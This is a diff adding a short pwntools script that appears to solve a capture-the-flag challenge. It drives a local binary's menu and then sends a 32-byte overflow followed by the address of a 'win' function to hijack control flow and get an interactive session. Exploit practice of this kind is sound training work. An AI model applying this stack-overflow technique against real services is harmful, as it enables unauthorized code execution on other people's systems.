@@ -1,0 +1,15 @@
+from pwn import *
+elf = context.binary = ELF("chal")
+p = remote("localhost", 8000) #process()
+cls = lambda: p.clean(timeout = 0.1)
+def send(x):
+    p.sendline(x)
+    cls()
+send(b"2")
+send(b"a")
+send(b"a")
+send(b"4")
+send(b"1")
+send(b"A" * 32 + p64(elf.sym["win"]))
+p.sendline(b"3")
+p.interactive()
